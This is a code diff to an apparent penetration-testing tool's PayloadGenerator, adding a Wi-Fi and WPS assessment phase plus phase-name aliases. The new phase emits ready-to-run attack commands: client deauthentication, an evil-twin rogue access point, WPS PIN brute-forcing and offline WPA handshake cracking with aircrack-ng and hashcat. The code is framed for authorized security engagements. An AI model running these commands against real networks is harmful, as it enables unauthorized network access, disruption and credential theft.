@@ -308,6 +308,86 @@ class PayloadGenerator:
         ]
 
     # ------------------------------------------------------------------
+    # Phase: Wireless Assessment (802.11 Wi-Fi + WPS)
+    #
+    # MITRE ATT&CK technique IDs used below are real, current Enterprise
+    # ATT&CK technique/sub-technique IDs (verified against attack.mitre.org,
+    # 2026):
+    #   T1669       Wi-Fi Networks (discovery/access via nearby wireless nets)
+    #   T1040       Network Sniffing (passive capture, incl. handshakes)
+    #   T1557       Adversary-in-the-Middle (parent technique)
+    #   T1557.004   AiTM: Evil Twin (rogue AP impersonating a legitimate SSID)
+    #   T1110       Brute Force (parent technique, covers WPS PIN attacks)
+    #   T1110.002   Brute Force: Password Cracking (offline handshake/PMKID crack)
+    #   T1595       Active Scanning (parent, covers Bluetooth/BLE discovery)
+    # `target` here is the BSSID (AP MAC) or SSID under test, `interface`
+    # is the wireless NIC in monitor mode.
+    # ------------------------------------------------------------------
+
+    def wireless(
+        self,
+        target: str,
+        interface: str = "wlan0",
+        channel: Optional[int] = None,
+        wordlist: str = "/usr/share/wordlists/rockyou.txt",
+    ) -> List[Payload]:
+        """802.11 Wi-Fi + WPS assessment payloads for an authorized wireless engagement."""
+        t = _validate_target(target)
+        mon = f"{interface}mon" if not interface.endswith("mon") else interface
+        chan = f"-c {channel} " if channel else ""
+        return [
+            # --- Discovery / recon (passive-to-low-risk) ---
+            Payload(f"airmon-ng start {interface}",
+                    "Put wireless NIC into monitor mode", "wireless", "T1669", "LOW",
+                    requires_root=True, tool="aircrack-ng-suite"),
+            Payload(f"airodump-ng {mon}",
+                    "Survey nearby APs and associated clients", "wireless", "T1669", "LOW",
+                    requires_root=True, tool="airodump-ng"),
+            Payload(f"kismet -c {mon}",
+                    "Passive wireless survey / rogue-AP and IDS-style detection", "wireless", "T1669", "LOW",
+                    requires_root=True, tool="kismet"),
+            Payload(f"wash -i {mon}",
+                    "Identify WPS-enabled access points in range", "wireless", "T1595", "LOW",
+                    requires_root=True, tool="wash (reaver-suite)"),
+            Payload(f"bluetoothctl scan on",
+                    "Nearby Bluetooth/BLE device discovery", "wireless", "T1595", "LOW", tool="bluetoothctl"),
+
+            # --- Targeted capture (medium risk — sends packets) ---
+            Payload(f"airodump-ng --bssid {t} {chan}-w wireless_capture {mon}",
+                    "Targeted capture on one AP — collects WPA/WPA2 4-way handshakes", "wireless", "T1040", "MEDIUM",
+                    requires_root=True, tool="airodump-ng"),
+            Payload(f"hcxdumptool -i {mon} -o wireless_capture.pcapng --enable_status=1",
+                    "PMKID + handshake capture (no client deauth required)", "wireless", "T1040", "MEDIUM",
+                    requires_root=True, tool="hcxdumptool"),
+            Payload(f"aireplay-ng --deauth 10 -a {t} {mon}",
+                    "Deauthenticate connected clients to force a fresh handshake capture", "wireless", "T1557.004", "HIGH",
+                    requires_root=True, tool="aireplay-ng"),
+            Payload(f"hostapd /etc/jakal/wireless_evil_twin.conf",
+                    "Stand up an authorized rogue AP (evil twin) to validate client/EDR detection", "wireless", "T1557.004", "HIGH",
+                    requires_root=True, tool="hostapd"),
+            Payload(f"bettercap -iface {interface} -eval 'wifi.recon on'",
+                    "Wireless recon + AiTM framework against in-scope clients", "wireless", "T1557", "MEDIUM",
+                    requires_root=True, tool="bettercap"),
+
+            # --- Credential attack (post-capture, offline unless noted) ---
+            Payload(f"reaver -i {mon} -b {t} -vv",
+                    "WPS PIN brute-force attack against target AP", "wireless", "T1110", "HIGH",
+                    requires_root=True, tool="reaver"),
+            Payload(f"bully -b {t} {chan}{mon}",
+                    "Alternate WPS PIN brute-force implementation", "wireless", "T1110", "HIGH",
+                    requires_root=True, tool="bully"),
+            Payload(f"aircrack-ng -w {wordlist} -b {t} wireless_capture-01.cap",
+                    "Offline dictionary crack of captured WPA/WPA2 handshake", "wireless", "T1110.002", "MEDIUM",
+                    tool="aircrack-ng"),
+            Payload(f"hcxpcapngtool -o wireless_hashes.22000 wireless_capture.pcapng",
+                    "Convert captured PMKID/handshake to hashcat format", "wireless", "T1040", "LOW",
+                    tool="hcxtools"),
+            Payload(f"hashcat -m 22000 wireless_hashes.22000 {wordlist}",
+                    "GPU-accelerated crack of converted PMKID/handshake hash", "wireless", "T1110.002", "MEDIUM",
+                    tool="hashcat"),
+        ]
+
+    # ------------------------------------------------------------------
     # Phase 7: Cleanup / Evidence Collection
     # ------------------------------------------------------------------
 
@@ -351,11 +431,26 @@ class PayloadGenerator:
             "recon_active":   self.recon_active,
             "enumeration":    self.enumeration,
             "web":            self.web_application,
+            "web_application": self.web_application,     # alias — cheatsheet/AIP phase vocabulary
             "vuln_analysis":  self.vulnerability_analysis,
+            "vulnerability_analysis": self.vulnerability_analysis,  # alias
             "post_exploit":   self.post_exploitation_assessment,
+            "post_exploitation_assessment": self.post_exploitation_assessment,  # alias
             "crypto_analysis": self.encryption_analysis,
+            "encryption_analysis": self.encryption_analysis,  # alias
+            "wireless":       self.wireless,
             "cleanup":        self.cleanup_and_evidence,
         }
+        # NOTE: the aliases above fix a real bug — AIPPayloadGenerator.generate_engagement()
+        # (backend/payloads/aip_payload_generator.py) iterates phases named
+        # "web_application" / "vulnerability_analysis" / "post_exploitation_assessment" /
+        # "encryption_analysis" (the cheatsheet-ontology vocabulary), but this map
+        # previously only recognized the short forms ("web", "vuln_analysis", ...).
+        # Every engagement plan for those four phases was silently falling back to
+        # mitre=[] (caught by the try/except in AIPPayloadGenerator.generate()) and
+        # serving cheatsheet-only results — the exact "cheatsheet-only fallback"
+        # problem reported for the wireless phase was already happening on 4 of the
+        # 7 default engagement phases before this fix.
         fn = phase_map.get(phase)
         if fn is None:
             raise ValueError(f"Unknown phase '{phase}'. Valid: {list(phase_map)}")
